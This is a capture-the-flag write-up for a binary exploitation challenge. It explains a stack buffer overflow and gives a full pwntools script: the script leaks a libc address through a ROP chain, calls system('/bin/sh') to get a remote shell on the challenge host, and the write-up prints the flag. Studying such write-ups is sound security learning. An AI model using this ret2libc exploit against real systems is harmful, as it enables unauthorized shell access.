# Welcome

## Challenge

We are given a binary an a glibc.

The binary disables buffering, prints a welcome message, then reads our input into a buffer.

### Checksec

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

## Solution

There is a buffer overflow vulnerability as the program reads more characters than the buffer can safely store.

As PIE is disabled and there is no canary, we can easily use the buffer overflow vulnerability to leak the libc address by calling `puts` on a GOT entry.
We then return to the vulnerable code for a second stage ropchain.

Once we have the libc address, we can use the second stage to call `system("/bin/sh")`, using libc functions.
This will spawn a shell and allow us to read the flag.

## Exploit

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 20.216.39.14 --port 1237 welc
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('welc')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '20.216.39.14'
port = int(args.PORT or 1237)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

libc = ELF('libc.so.6')

io = start()

rop = ROP(exe)
rop.call('puts', [exe.got['puts']])
rop.call('main')

io.sendlineafter(
        b"Zied likes degla b zbib ! what about you ?\n",
        flat({
            0x80+8: rop.chain(),
        })
    )

libc.address = unpack(io.recvuntil(b"\n", drop=True).ljust(8, b'\x00')) - libc.sym['puts']
io.info("LIBC: " + hex(libc.address))

rop = ROP(libc)
rop.raw(rop.ret)
rop.call('system', [next(libc.search(b"/bin/sh"))])

io.sendlineafter(
        b"Zied likes degla b zbib ! what about you ?\n",
        flat({
            0x80+8: rop.chain(),
        })
    )

io.interactive()
```

## Flag

```
Securinets{5d91d2e01b854fd457c1d8b592a19b38af6b4a33c6362b7d}
```
